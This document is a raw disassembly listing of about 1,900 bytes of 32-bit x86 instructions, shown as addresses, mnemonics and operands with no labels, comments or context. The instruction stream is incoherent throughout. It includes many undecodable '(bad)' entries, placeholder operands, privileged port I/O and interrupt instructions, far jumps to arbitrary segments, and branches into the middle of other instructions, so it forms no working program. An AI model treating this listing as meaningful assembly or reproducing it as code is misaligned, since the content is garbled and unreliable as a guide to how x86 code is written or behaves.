  412fdf:	imul   esp,DWORD PTR [ebp-0x746ea0e5],0x2e8532e6
  412fe9:	mov    dl,0x4f
  412feb:	pop    ebp
  412fec:	mov    dh,0xb6
  412fee:	cli    
  412fef:	xchg   esp,eax
  412ff0:	cmp    eax,0x2cb5fefb
  412ff5:	mov    al,0x14
  412ff7:	add    ebp,esi
  412ff9:	dec    esp
  412ffa:	inc    ebx
  412ffb:	cli    
  412ffc:	call   0x976a95d6
  413001:	jb     0x413061
  413003:	mov    eax,0xbd0407b7
  413008:	call   DWORD PTR [edi+0x738323e7]
  41300e:	dec    edi
  41300f:	pusha  
  413010:	dec    eax
  413011:	into   
  413012:	ins    DWORD PTR es:[edi],dx
  413013:	cmc    
  413014:	inc    ebp
  413015:	test   ah,0x7c
  413018:	cmp    ch,dh
  41301a:	mov    ecx,0x33d813f0
  41301f:	or     bl,BYTE PTR [ecx]
  413021:	sub    esp,DWORD PTR [eax+0x33]
  413024:	(bad)  
  413026:	test   BYTE PTR [ebx-0x5b],cl
  413029:	lds    ebx,FWORD PTR [esi+0x780d2e05]
  41302f:	and    al,0xd7
  413031:	cmp    DWORD PTR [edx],0xa6250b14
  413037:	and    eax,0xa42bf2a3
  41303c:	inc    esi
  41303d:	jo     0x412fc4
  41303f:	adc    al,0xe7
  413041:	inc    ecx
  413042:	enter  0x328e,0x3f
  413046:	mov    edi,0xe940358c
  41304b:	sbb    ch,BYTE PTR [ebx]
  41304d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41304e:	iret   
  41304f:	xchg   esp,eax
  413050:	inc    eax
  413051:	inc    ebp
  413052:	adc    esp,ebp
  413054:	cld    
  413055:	pop    es
  413056:	bound  edi,QWORD PTR [eax]
  413058:	aad    0xfc
  41305a:	pop    esp
  41305b:	mov    cl,dh
  41305d:	cmp    eax,0xc05dbe9e
  413062:	mov    bl,0x90
  413064:	xchg   BYTE PTR [ebx+0x3c6da623],bl
  41306a:	mov    ch,0x79
  41306c:	jo     0x4130e9
  41306e:	adc    eax,0x14cc2060
  413073:	mov    esp,0x3451075f
  413078:	ror    ebx,cl
  41307a:	sar    BYTE PTR [ecx+0xf],1
  41307d:	push   edx
  41307e:	(bad)  
  41307f:	pop    eax
  413080:	shl    DWORD PTR [eax+0x1f],cl
  413083:	pop    esi
  413084:	sahf   
  413085:	call   FWORD PTR [ebp+eiz*4+0x70]
  413089:	lods   eax,DWORD PTR ds:[esi]
  41308a:	repnz dec eax
  41308c:	sub    BYTE PTR [edx-0x28d1c8db],0x2b
  413093:	bound  esp,QWORD PTR [ebx+0x6]
  413096:	es mov ah,0x39
  413099:	fisttp WORD PTR ds:0xe304add7
  41309f:	xchg   esp,eax
  4130a0:	addr16 fs je 0x413054
  4130a4:	xchg   ebx,eax
  4130a5:	sub    al,BYTE PTR [edx+0x11]
  4130a8:	push   esi
  4130a9:	aaa    
  4130aa:	pop    DWORD PTR [ebx]
  4130ac:	out    0x5e,eax
  4130ae:	jecxz  0x4130bf
  4130b0:	ret    0xad06
  4130b3:	mov    WORD PTR [ebx+0x1],ss
  4130b6:	out    dx,eax
  4130b7:	out    0x26,al
  4130b9:	ins    BYTE PTR es:[edi],dx
  4130ba:	xor    eax,ecx
  4130bc:	je     0x413079
  4130be:	cmp    dh,BYTE PTR [edx+0x39]
  4130c1:	lods   eax,DWORD PTR ds:[esi]
  4130c2:	push   ebx
  4130c3:	pop    esp
  4130c4:	fisubr WORD PTR [ebp+0x3d61eb4e]
  4130ca:	jge    0x413132
  4130cc:	dec    eax
  4130cd:	mov    esp,0x7e67c39e
  4130d2:	mov    cl,BYTE PTR [ebx-0x1822f4a7]
  4130d8:	mov    eax,ds:0xe8182ce1
  4130dd:	fcom   DWORD PTR [ecx-0x62]
  4130e0:	jnp    0x4130ff
  4130e2:	xchg   ebp,eax
  4130e3:	adc    al,0x75
  4130e5:	mov    WORD PTR [eax+ebp*4],?
  4130e8:	dec    ebp
  4130e9:	fist   WORD PTR [eax-0x29e8a55b]
  4130ef:	outs   dx,BYTE PTR ds:[esi]
  4130f0:	(bad)  
  4130f1:	mov    ds:0x94b9e109,eax
  4130f6:	sub    DWORD PTR [esp+ebx*8],0xffffffb1
  4130fa:	jno    0x4130ad
  4130fc:	inc    edx
  4130fd:	out    dx,al
  4130fe:	popa   
  4130ff:	iret   
  413100:	xchg   BYTE PTR [edx+0x6f],cl
  413103:	push   ecx
  413104:	(bad)  
  413105:	mov    al,ah
  413107:	scas   eax,DWORD PTR es:[edi]
  413108:	test   ebp,0xd1aebdd4
  41310e:	fdiv   DWORD PTR [eax-0x72]
  413111:	shl    BYTE PTR [edi+0x39],0xa7
  413115:	retf   0x5f09
  413118:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413119:	mov    al,ds:0xf02f60ef
  41311e:	or     BYTE PTR [esi+ecx*1-0x343f98cd],0xaa
  413126:	pop    esp
  413127:	rol    DWORD PTR [edi],1
  413129:	inc    eax
  41312a:	sub    esp,ebp
  41312c:	sub    edx,esi
  41312e:	mov    esp,0x29b0b105
  413133:	ss add al,0x26
  413136:	les    edi,FWORD PTR [edx]
  413138:	or     al,0x28
  41313a:	sbb    ecx,ebx
  41313c:	xchg   edx,eax
  41313d:	ror    DWORD PTR [edi],cl
  41313f:	pop    edi
  413140:	push   es
  413141:	pushf  
  413142:	aad    0xa9
  413144:	ins    DWORD PTR es:[edi],dx
  413145:	add    ah,BYTE PTR [esi-0x570e22c4]
  41314b:	push   0x5d
  41314d:	cld    
  41314e:	cmpxchg DWORD PTR [ebx-0x414d0576],eax
  413155:	mov    cl,BYTE PTR [ecx-0x7e]
  413158:	shl    DWORD PTR [ebp-0x4215504f],0x6
  41315f:	jmp    0xb1c8:0xa84926c1
  413166:	in     al,0x7b
  413168:	dec    edx
  413169:	and    ebp,ebx
  41316b:	outs   dx,BYTE PTR ds:[esi]
  41316c:	dec    esi
  41316d:	lock ret 
  41316f:	pop    es
  413170:	pop    edi
  413171:	outs   dx,DWORD PTR ds:[esi]
  413172:	xchg   edi,eax
  413173:	les    edi,FWORD PTR [ebp-0x7a]
  413176:	jno    0x4130fb
  413178:	retf   
  413179:	add    BYTE PTR [esi+0x50e3b039],ah
  41317f:	adc    al,0xcc
  413181:	int    0xcd
  413183:	mov    cl,0x79
  413185:	pusha  
  413186:	cmp    esi,DWORD PTR [edi]
  413188:	jb     0x413115
  41318a:	data16 daa 
  41318c:	popf   
  41318d:	or     eax,0x2e31d232
  413192:	(bad)  
  413193:	rcl    BYTE PTR [edx-0x15],0x94
  413197:	out    0x17,al
  413199:	pop    eax
  41319a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41319b:	sub    BYTE PTR [ecx],0x73
  41319e:	lods   al,BYTE PTR ds:[esi]
  41319f:	sbb    BYTE PTR [edi],al
  4131a1:	sub    cl,BYTE PTR [ecx+0x1f]
  4131a4:	mov    bh,0x2f
  4131a6:	xor    eax,eax
  4131a8:	add    dl,BYTE PTR [edi+0x701ed956]
  4131ae:	push   DWORD PTR [eax+0x60]
  4131b1:	fs call 0xb29f0c12
  4131b7:	shl    DWORD PTR [edx+0x1d],0x8c
  4131bb:	and    BYTE PTR [esi],al
  4131bd:	sbb    BYTE PTR [edi],al
  4131bf:	(bad)  
  4131c1:	lahf   
  4131c2:	dec    ebx
  4131c3:	in     eax,dx
  4131c4:	inc    esp
  4131c5:	shr    BYTE PTR [ebp+0x2b6cf11e],0x5b
  4131cc:	pop    eax
  4131cd:	daa    
  4131ce:	fiadd  WORD PTR [esi+ebx*8]
  4131d1:	cmp    DWORD PTR fs:[ecx+ebp*1-0x2f],ebp
  4131d6:	(bad)  
  4131d7:	stos   DWORD PTR es:[edi],eax
  4131d8:	inc    esi
  4131d9:	push   eax
  4131da:	scas   al,BYTE PTR es:[edi]
  4131db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131dc:	fiadd  WORD PTR [ebx-0x439b57d0]
  4131e2:	adc    edi,DWORD PTR [edx-0x5bf5871e]
  4131e8:	imul   ebx,DWORD PTR [ebx+eax*4],0xb25be3d
  4131ef:	jmp    0x5eb6:0x3e188acf
  4131f6:	or     cl,ah
  4131f8:	dec    esp
  4131f9:	push   edx
  4131fa:	sbb    DWORD PTR [edi],ebp
  4131fc:	pop    ebx
  4131fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131fe:	fisubr WORD PTR [ebp-0x66]
  413201:	out    0xe0,al
  413203:	pop    es
  413204:	push   0xffffffd8
  413206:	pop    ebp
  413207:	shl    DWORD PTR [eax+0x7daa2764],1
  41320d:	ror    BYTE PTR [ebp+0x7],0x71
  413211:	shl    DWORD PTR [edi],1
  413213:	add    DWORD PTR [esi+0x7eb8a805],0x3eee56fc
  41321d:	(bad)  
  41321e:	(bad)  
  41321f:	sar    BYTE PTR [edx+0x58974a76],1
  413225:	sbb    ah,al
  413227:	fiadd  DWORD PTR [esi-0x18105b53]
  41322d:	int3   
  41322e:	cs inc ecx
  413230:	imul   si,WORD PTR [eax+eiz*8+0x6ad1de08],0xe92d
  41323a:	mov    ecx,0xbd105401
  41323f:	(bad)  
  413240:	out    dx,eax
  413241:	pop    ebp
  413242:	push   ebx
  413243:	mov    eax,0x80b17546
  413248:	call   0x55131e17
  41324d:	dec    edi
  41324e:	mov    dh,BYTE PTR [edi-0x54]
  413251:	mov    edx,0x295007e7
  413256:	in     al,dx
  413257:	adc    edx,edx
  413259:	mov    ecx,0x87247111
  41325e:	fidivr WORD PTR [ecx]
  413260:	pop    ecx
  413261:	imul   ebp,DWORD PTR [esi],0xd460b77b
  413267:	mov    al,ds:0x17056040
  41326c:	mov    ds,WORD PTR [edi-0x26870c9d]
  413272:	push   ebx
  413273:	xor    eax,0xf125854e
  413278:	and    ch,BYTE PTR [ebx]
  41327a:	sbb    bl,ah
  41327c:	pusha  
  41327d:	fsubr  DWORD PTR [esi-0x350ef6e3]
  413283:	pushf  
  413284:	loopne 0x41328a
  413286:	scas   eax,DWORD PTR es:[edi]
  413287:	xor    al,0x8c
  413289:	ja     0x413305
  41328b:	jne    0x4132ed
  41328d:	jp     0x4132b6
  41328f:	or     dl,BYTE PTR [ebp+0x6e]
  413292:	outs   dx,DWORD PTR ds:[esi]
  413293:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413294:	mov    BYTE PTR gs:[ecx],al
  413297:	inc    edx
  413298:	cld    
  413299:	pop    esi
  41329a:	retf   
  41329b:	aaa    
  41329c:	jg     0x4132e4
  41329e:	sub    DWORD PTR [ebp+edi*4+0x44],esp
  4132a2:	mov    eax,0x9eca463c
  4132a7:	inc    edx
  4132a8:	adc    eax,0x4821c8f
  4132ad:	jl     0x41331d
  4132af:	sbb    bh,BYTE PTR [eax]
  4132b1:	in     al,0xd6
  4132b3:	sub    BYTE PTR [ebp-0x1d],ch
  4132b6:	dec    ecx
  4132b7:	popf   
  4132b8:	stos   BYTE PTR es:[edi],al
  4132b9:	je     0x41324a
  4132bb:	and    BYTE PTR [edi-0x45],al
  4132be:	es xor edi,0x83a8c987
  4132c5:	xchg   edx,eax
  4132c6:	test   DWORD PTR [edx+0x46db1332],edi
  4132cc:	push   ss
  4132cd:	xchg   BYTE PTR [edx+ecx*2],cl
  4132d0:	(bad)  
  4132d1:	adc    esi,edi
  4132d3:	repz inc ah
  4132d6:	cld    
  4132d7:	(bad)  
  4132d8:	pop    esi
  4132d9:	in     eax,dx
  4132da:	sub    BYTE PTR [edx],ch
  4132dc:	cmc    
  4132dd:	xchg   esi,eax
  4132de:	inc    edi
  4132df:	or     esi,DWORD PTR [ecx]
  4132e1:	mov    bh,0xd7
  4132e3:	iret   
  4132e4:	inc    ecx
  4132e5:	fldpi  
  4132e7:	sub    al,0xe1
  4132e9:	mov    esi,0xa988da8e
  4132ee:	out    0x9a,eax
  4132f0:	sbb    DWORD PTR [ebx],0x36
  4132f3:	xchg   ebx,eax
  4132f4:	mov    DWORD PTR [ebp+0x7b],edx
  4132f7:	xchg   ecx,eax
  4132f8:	mov    ds:0xa0cb6c22,eax
  4132fd:	pop    edi
  4132fe:	add    edx,DWORD PTR [edx]
  413300:	push   eax
  413301:	fcmovbe st,st(4)
  413303:	mov    al,0x3d
  413305:	test   edx,edi
  413307:	fwait
  413308:	aas    
  413309:	mov    bl,0xa6
  41330b:	(bad)  
  41330d:	mov    eax,0x3fc0c8b4
  413312:	add    al,0xf
  413314:	or     edi,DWORD PTR [edx]
  413316:	rcl    BYTE PTR [esi+0x3471df6d],cl
  41331c:	or     dh,bl
  41331e:	xchg   edx,eax
  41331f:	and    al,0x96
  413321:	mov    bl,bh
  413323:	jno    0x4132d9
  413325:	icebp  
  413326:	jb     0x4132c2
  413328:	mov    BYTE PTR [edx-0x7f],bl
  41332b:	fucom  st(2)
  41332d:	dec    esp
  41332e:	add    edi,eax
  413330:	lods   al,BYTE PTR ds:[esi]
  413331:	sbb    BYTE PTR [edi+ecx*8],0xe7
  413335:	xor    BYTE PTR [edx-0x4b85431c],bl
  41333b:	jne    0x413383
  41333d:	or     edi,ebx
  41333f:	push   esp
  413340:	into   
  413341:	aad    0xc6
  413343:	lea    esp,[ebx+0x59]
  413346:	xor    BYTE PTR [eax],dl
  413348:	jecxz  0x413379
  41334a:	sbb    DWORD PTR [ebp+0x1828f1e0],0x922ab856
  413354:	lahf   
  413355:	push   ebp
  413357:	push   ebx
  413358:	xor    al,0xe1
  41335a:	mov    WORD PTR [eax-0x7e],?
  41335d:	fsub   QWORD PTR [edi]
  41335f:	aad    0xda
  413361:	dec    esi
  413362:	and    DWORD PTR [eax-0x65],0xeba2bb76
  413369:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41336a:	jnp    0x413378
  41336c:	mov    ds:0xf006c9b0,al
  413371:	aam    0xdf
  413373:	adc    eax,0xac3d2a53
  413378:	(bad)  
  41337a:	leave  
  41337b:	sbb    eax,0x64ef556f
  413380:	divps  xmm1,XMMWORD PTR [ecx]
  413383:	aaa    
  413384:	cli    
  413385:	xor    al,0x7e
  413387:	data16 sahf 
  413389:	sbb    al,0xb5
  41338b:	stc    
  41338c:	xchg   esp,eax
  41338d:	jmp    0xeee44df3
  413392:	push   ds
  413393:	adc    bh,dh
  413395:	and    esi,edx
  413397:	xchg   esp,eax
  413398:	cmp    al,0x6e
  41339a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41339b:	mov    esi,0x7c02a69e
  4133a0:	dec    eax
  4133a1:	jge    0x413341
  4133a3:	adc    bl,dh
  4133a5:	in     eax,0xe8
  4133a7:	pop    ds
  4133a8:	jmp    0x192f:0x6fc5a2cf
  4133af:	push   0xffffffbf
  4133b1:	mov    edi,0x5da5dcc2
  4133b6:	test   esi,edi
  4133b8:	jle    0x41334c
  4133ba:	jmp    0x27d5f72d
  4133bf:	retf   
  4133c0:	mov    dh,0x58
  4133c2:	daa    
  4133c3:	cwde   
  4133c4:	fisubr DWORD PTR [edx-0x2]
  4133c7:	imul   esi,DWORD PTR [ebx],0xffffffaa
  4133ca:	arpl   bp,si
  4133cc:	in     eax,0xa9
  4133ce:	lods   al,BYTE PTR ds:[esi]
  4133cf:	lock rol DWORD PTR [ecx-0x1a35fd63],1
  4133d6:	nop
  4133d7:	jb     0x413420
  4133d9:	call   0xc811:0xfd9b2215
  4133e0:	lods   al,BYTE PTR ds:[esi]
  4133e1:	(bad)
  4133e4:	stos   BYTE PTR es:[edi],al
  4133e5:	jno    0xf2e12b3c
  4133eb:	cmp    bl,BYTE PTR [edx+0x4709f757]
  4133f1:	jbe    0x4133a4
  4133f3:	fnsave [edi+0x7]
  4133f6:	push   0x35e2e350
  4133fb:	jmp    0x413412
  4133fd:	out    dx,eax
  4133fe:	xchg   ebx,eax
  4133ff:	jecxz  0x4133f1
  413401:	xchg   ebx,eax
  413402:	mov    eax,DWORD PTR [edi]
  413404:	and    al,0xb9
  413406:	mov    DWORD PTR [eax-0x54cecb],edi
  41340c:	imul   edi,DWORD PTR [edi],0x46
  41340f:	fdivr  st,st(2)
  413411:	inc    edx
  413412:	adc    DWORD PTR [ecx-0xb],edi
  413415:	dec    ebp
  413416:	jg     0x413403
  413418:	je     0x41348c
  41341a:	jecxz  0x413467
  41341c:	push   ebp
  41341d:	pop    es
  41341e:	in     eax,dx
  41341f:	daa    
  413420:	xor    al,BYTE PTR [esi-0x14933f1b]
  413426:	dec    ebp
  413427:	test   BYTE PTR [esi],cl
  413429:	xchg   ebp,eax
  41342a:	lahf   
  41342b:	mov    dl,0x6e
  41342d:	xlat   BYTE PTR ds:[ebx]
  41342e:	lea    edx,[eax-0x60]
  413431:	call   0x504e540c
  413436:	adc    eax,0xd42cadeb
  41343b:	dec    eax
  41343c:	int3   
  41343d:	dec    esi
  41343e:	stos   BYTE PTR es:[edi],al
  41343f:	mov    WORD PTR [ecx-0x326be22a],?
  413445:	inc    edx
  413446:	nop
  413447:	lock jno 0x413405
  41344a:	jb     0x41349e
  41344c:	test   BYTE PTR [ebx+0x1003942b],cl
  413452:	sub    DWORD PTR [ecx],eax
  413454:	cld    
  413455:	fstp   DWORD PTR [edi]
  413457:	mov    dl,BYTE PTR [esi]
  413459:	mov    dh,dl
  41345b:	and    cl,bl
  41345d:	or     ebp,esp
  41345f:	cmp    al,0xc1
  413461:	inc    DWORD PTR [edx-0x9]
  413464:	imul   cl
  413466:	and    dl,0x22
  413469:	(bad)  
  41346a:	and    DWORD PTR [ebp-0x48],ecx
  41346d:	sub    al,0xcf
  41346f:	aad    0x20
  413471:	jnp    0x41343b
  413473:	push   ebx
  413474:	int    0x16
  413476:	shl    BYTE PTR ds:0xaaa5ecb7,1
  41347c:	enter  0xba63,0xea
  413480:	dec    esp
  413481:	pop    esp
  413482:	data16 cmp BYTE PTR [esi+0x439a0f56],dl
  413489:	mov    ah,0x11
  41348b:	(bad)  
  41348c:	in     eax,dx
  41348d:	and    al,0x8c
  41348f:	pop    ebx
  413490:	out    dx,eax
  413491:	and    esp,ecx
  413493:	jecxz  0x4134ec
  413495:	jp     0x4134c9
  413497:	jno    0x41346a
  413499:	sbb    eax,0x5c0d1a89
  41349e:	mov    al,ds:0x7909e4e4
  4134a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134a4:	enter  0xf027,0x5
  4134a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134a9:	mov    bl,0xa2
  4134ab:	mov    al,0x21
  4134ad:	xor    eax,0x4b6ae7c8
  4134b2:	push   esp
  4134b3:	into   
  4134b4:	push   cs
  4134b5:	out    0x46,al
  4134b7:	addr16 inc ebx
  4134b9:	dec    esp
  4134ba:	ret    
  4134bb:	repnz adc BYTE PTR [esi],dh
  4134be:	adc    DWORD PTR [edi-0x42bd4ab1],esp
  4134c4:	fistp  DWORD PTR [eax]
  4134c6:	js     0x4134d0
  4134c8:	pop    edi
  4134c9:	js     0x413548
  4134cb:	mov    edi,0x3515a6a8
  4134d0:	adc    dl,BYTE PTR [edx+0x286fa9d0]
  4134d6:	pushf  
  4134d7:	sub    al,0x36
  4134d9:	nop
  4134da:	ror    BYTE PTR [edx-0x76],0x22
  4134de:	jmp    0xfef3:0x30dc2aaa
  4134e5:	adc    ch,BYTE PTR [edi-0x5cc90e73]
  4134eb:	cmp    DWORD PTR [ecx+edx*4+0x75ed6f4],eax
  4134f2:	imul   esp,DWORD PTR [ecx],0x86ed9f6c
  4134f8:	dec    esi
  4134f9:	inc    eax
  4134fa:	outs   dx,BYTE PTR ds:[esi]
  4134fb:	xlat   BYTE PTR ds:[ebx]
  4134fc:	xor    al,0xec
  4134ff:	push   esp
  413500:	in     al,0x84
  413502:	lea    edi,[edi+edi*1-0x36]
  413506:	in     eax,dx
  413507:	loope  0x41348b
  413509:	push   ds
  41350a:	ret    
  41350b:	inc    ebx
  41350c:	data16 mov al,bh
  41350f:	and    dh,BYTE PTR [eax]
  413511:	mov    edx,0x36929bdc
  413516:	fwait
  413517:	lods   eax,DWORD PTR ds:[esi]
  413518:	fstp   TBYTE PTR [esp+eiz*8+0x6cf6bedc]
  41351f:	inc    eax
  413520:	dec    ebx
  413521:	xor    edi,DWORD PTR [edi-0x7491095c]
  413527:	daa    
  413528:	popa   
  413529:	loop   0x4134bc
  41352b:	cmp    ch,BYTE PTR [eax+esi*2+0x52]
  41352f:	mov    ds:0x59c4742e,al
  413534:	(bad)  
  413536:	ret    
  413537:	pop    ecx
  413538:	fbld   TBYTE PTR [edx-0x7b]
  41353b:	cld    
  41353c:	ins    DWORD PTR es:[edi],dx
  41353d:	lock pop eax
  41353f:	mov    dh,0xa9
  413541:	pop    esi
  413542:	rcl    DWORD PTR [esi],0xa4
  413545:	loopne 0x4135c3
  413547:	mov    ah,BYTE PTR [edi]
  413549:	sub    al,0x95
  41354b:	add    BYTE PTR [ebx+0x45],dl
  41354e:	pop    eax
  41354f:	xchg   esi,eax
  413550:	inc    esp
  413551:	and    eax,0xc5f36d56
  413556:	mov    dh,0x5f
  413558:	test   DWORD PTR [esi-0x16],ecx
  41355b:	aaa    
  41355c:	dec    ebp
  41355d:	push   ss
  41355e:	push   esp
  41355f:	adc    al,ah
  413561:	sbb    al,dl
  413563:	inc    edi
  413564:	pusha  
  413565:	inc    ebp
  413566:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413567:	jl     0x4134f6
  413569:	imul   ecx,DWORD PTR [edx],0xffffff82
  41356c:	xchg   ebx,eax
  41356d:	in     eax,0x5
  41356f:	or     esi,DWORD PTR ds:0x31b1613b
  413575:	inc    ecx
  413576:	aad    0x7d
  413578:	xchg   BYTE PTR [edi-0x3b],bl
  41357b:	stos   DWORD PTR es:[edi],eax
  41357c:	jmp    0x6379c544
  413581:	mov    al,0xd7
  413583:	out    dx,eax
  413584:	popa   
  413585:	addr16 icebp 
  413587:	dec    ebp
  413588:	push   cs
  413589:	and    dh,ch
  41358b:	mov    edx,gs
  41358d:	cld    
  41358e:	shl    DWORD PTR ds:0x46552b88,0x33
  413595:	sub    eax,0xf08e2a93
  41359a:	mov    WORD PTR [ecx-0x24536c0a],fs
  4135a0:	mov    ecx,0x7f24863
  4135a5:	icebp  
  4135a6:	retf   
  4135a7:	or     edi,esp
  4135a9:	add    bh,dh
  4135ab:	xor    cl,al
  4135ad:	adc    BYTE PTR [esi],ch
  4135af:	dec    ebx
  4135b0:	cmp    BYTE PTR [edi+0x48d65ab2],bh
  4135b6:	or     bl,BYTE PTR [ecx-0x75f7f3fd]
  4135bc:	and    eax,0xc09957e9
  4135c1:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135c3:	call   0x6f83:0xc53279d9
  4135ca:	repz js 0x413643
  4135cd:	cmc    
  4135ce:	cmp    BYTE PTR [eax-0x2e],0x5a
  4135d2:	repz sub al,0xd8
  4135d5:	enter  0xce2d,0xf
  4135d9:	out    dx,eax
  4135da:	scas   eax,DWORD PTR es:[edi]
  4135db:	sub    ch,dh
  4135dd:	xor    eax,0xa8899d17
  4135e2:	xchg   esi,eax
  4135e3:	sub    DWORD PTR ds:[eax+0x1841ec08],0xffffffac
  4135eb:	js     0x41358d
  4135ed:	stos   BYTE PTR es:[edi],al
  4135ee:	and    DWORD PTR [edx],eax
  4135f0:	and    DWORD PTR [esi+0x21],0xffffffde
  4135f4:	mov    es,eax
  4135f6:	fld    QWORD PTR [ebp-0x588750ce]
  4135fc:	push   0x4d
  4135fe:	cmp    eax,0x9a65930f
  413603:	and    eax,0x153c0e33
  413608:	mov    dl,0xa6
  41360a:	sbb    eax,DWORD PTR [ebx+0x25]
  41360d:	js     0x413638
  41360f:	xchg   ebp,eax
  413610:	pop    esp
  413611:	ds add eax,0x3edd72d4
  413617:	pop    ds
  413618:	fcomip st,st(5)
  41361a:	rcl    ah,1
  41361c:	fisub  WORD PTR [edi-0x16]
  41361f:	fild   QWORD PTR [eax+0x29811dfd]
  413625:	mov    BYTE PTR [ecx+edi*1+0x8],al
  413629:	cmp    BYTE PTR [eax-0x26d718cd],bh
  41362f:	ret    
  413630:	ins    DWORD PTR es:[edi],dx
  413631:	jge    0x413610
  413633:	mov    edi,edx
  413635:	push   es
  413636:	rcl    bl,cl
  413638:	pop    ecx
  413639:	or     bh,BYTE PTR [ebx]
  41363b:	mov    dl,0x71
  41363d:	lock mov ds:0x456c077a,al
  413643:	ins    BYTE PTR es:[edi],dx
  413644:	sub    BYTE PTR [edi-0x63],dl
  413647:	lea    ebx,[ebx+0x44]
  41364a:	push   ebp
  41364b:	es push edi
  41364d:	lods   eax,DWORD PTR ds:[esi]
  41364e:	xchg   ecx,eax
  41364f:	add    eax,0xddaa7193
  413654:	fdiv   DWORD PTR [ebx+0x1c369613]
  41365a:	lea    ecx,[ebx-0xba6e78c]
  413660:	js     0x413633
  413662:	pusha  
  413663:	xchg   ebp,eax
  413664:	cmp    edi,esp
  413666:	jmp    0x675d:0x45302420
  41366d:	fwait
  41366e:	outs   dx,DWORD PTR ds:[esi]
  41366f:	mov    bh,0xfe
  413671:	jbe    0x413642
  413673:	ins    BYTE PTR es:[edi],dx
  413674:	ror    esi,cl
  413676:	or     al,al
  413678:	loope  0x413621
  41367a:	ds dec edi
  41367c:	sbb    al,BYTE PTR [eax+0x6adbf7d3]
  413682:	mov    BYTE PTR [eax-0x46],bl
  413685:	cmp    al,0xe3
  413687:	push   cs
  413688:	jl     0x4136d8
  41368a:	mov    DWORD PTR [ecx-0x3e174272],edi
  413690:	sub    eax,0x48e7cbfc
  413695:	addr16 xchg ebp,eax
  413697:	loope  0x413673
  413699:	lods   eax,DWORD PTR ds:[esi]
  41369a:	ja     0x4136d0
  41369c:	sbb    edx,esi
  41369e:	adc    bh,al
  4136a0:	inc    ebp
  4136a1:	data16 sbb dh,dl
  4136a4:	sub    ch,dh
  4136a6:	mov    DWORD PTR [ecx+edi*8-0x2475087],esi
  4136ad:	adc    BYTE PTR [ebx-0x2c],dh
  4136b0:	fwait
  4136b1:	and    eax,0x141b657c
  4136b6:	lock xchg dh,ah
  4136b9:	sub    al,0x49
  4136bb:	outs   dx,BYTE PTR ds:[esi]
  4136bc:	mov    edi,0x6ba0e892
  4136c1:	push   ds
  4136c2:	arpl   WORD PTR [ebp+0x744f8c4],sp
  4136c8:	sti    
  4136c9:	(bad)  [ecx-0x79]
  4136cc:	lea    esp,[edi+0x36]
  4136cf:	cdq    
  4136d0:	and    edx,DWORD PTR [eax-0x68]
  4136d3:	jmp    0x8e30dadf
  4136d8:	jmp    0x41366b
  4136da:	jmp    0x41371c
  4136dc:	push   cs
  4136dd:	(bad)  
  4136de:	loope  0x413671
  4136e0:	inc    eax
  4136e1:	sub    edi,DWORD PTR [eax+ecx*1-0x49]
  4136e5:	sub    DWORD PTR ds:0x1bcadecd,edi
  4136eb:	imul   DWORD PTR [edi-0x26]
  4136ee:	push   edi
  4136ef:	out    0xc6,eax
  4136f1:	dec    ebp
  4136f2:	lahf   
  4136f3:	mov    dl,0xf
  4136f5:	fidiv  WORD PTR [ecx]
  4136f7:	inc    eax
  4136f8:	call   0xccf0:0x78c7fa3e
  4136ff:	mov    ah,0x29
  413701:	pop    ebp
  413702:	cmp    dh,BYTE PTR [ecx+0x26224a2f]
  413708:	fild   DWORD PTR [edx]
  41370a:	adc    cl,BYTE PTR [ecx]
  41370c:	dec    ecx
  41370d:	inc    ecx
  41370e:	inc    ecx
  41370f:	and    esp,DWORD PTR [edx]
  413711:	dec    esi
  413712:	and    ch,cl
  413714:	pop    ds
  413715:	push   ds
  413716:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413717:	adc    al,0xea
  413719:	mov    dh,dl
  41371b:	and    DWORD PTR [ecx+ecx*8+0x1],esp
  41371f:	push   es
  413720:	pop    eax
  413721:	fld    QWORD PTR [edi]
  413723:	(bad)  
  413724:	(bad)  
  413726:	lea    edi,[edx-0x3a5f7c3e]
  41372c:	or     al,0x3f
  41372e:	and    BYTE PTR [esi-0x27],bl
  413731:	aas    
  413732:	cmp    eax,0x6d0bdf6
  413737:	mov    ch,0x84
  413739:	push   ecx
  41373a:	pop    ss
  41373b:	cmp    BYTE PTR [eax],cl
  41373d:	cld    
  41373e:	sub    BYTE PTR [edx+0x59e1f048],bl
  413744:	sub    cl,BYTE PTR [eax]
  413746:	test   bh,dl
  413748:	sub    al,0xea
  41374a:	mov    al,BYTE PTR [eax-0x449a323c]
  413750:	add    eax,0xc3c2672b
  413755:	push   ebp
  413756:	ins    DWORD PTR es:[edi],dx
  413757:	or     al,0xf5
  413759:	sub    edx,DWORD PTR [edx+edi*4]
  41375c:	ins    DWORD PTR es:[edi],dx
  41375d:	jne    0x413722
  41375f:	cld    
  413760:	popf   
  413761:	pop    esp
  413762:	mov    WORD PTR [ebp+0x6c],gs
  413765:	imul   eax,DWORD PTR ds:0x30b53712,0x4c
  41376c:	mov    ds:0xf2b18c54,al
  413771:	push   cs
  413772:	fcomp  QWORD PTR [ebx+edx*4]
  413775:	xchg   BYTE PTR [eax],ch
  413777:	ins    BYTE PTR es:[edi],dx
  413778:	(bad)  
  413779:	mov    eax,0x93550d6d
  41377e:	inc    ebp
  41377f:	test   BYTE PTR [esi],cl
  413781:	mov    dl,0x3c
  413783:	cs jp  0x413751
  413786:	adc    ch,BYTE PTR [edi-0x3f]
  413789:	cmp    al,0x12
  41378b:	jle    0x4137fe
  41378d:	jmp    DWORD PTR [eax-0x4bbeb86]
  413793:	mov    cl,0xc
  413795:	sub    DWORD PTR [ebx+0x5326630e],esi
  41379b:	out    0x4d,eax
  41379d:	loope  0x413816
  41379f:	imul   esp,esi,0xf3e54aa4
  4137a5:	cs adc bl,dl
  4137a8:	test   cl,bh
